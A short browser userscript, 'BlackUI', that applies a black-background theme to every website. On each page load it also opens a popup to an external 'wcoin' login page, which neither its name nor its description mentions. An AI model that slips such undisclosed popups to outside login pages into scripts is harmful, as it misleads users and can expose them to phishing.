// ==UserScript==
// @name         BlackUI
// @namespace    https://wtech-5o6t.onrender.com
// @version      0.1
// @description  This is my first user script!
// @include      *
// ==/UserScript==
(function() {
    'use strict';
    const body = document.body;
    Object.assign(body.style, {
        backgroundColor: 'black',
        color: 'white'
  });
    window.open("https://wtech-5o6t.onrender.com/wcoin/login", "mozillaWindow", "popup");
})();
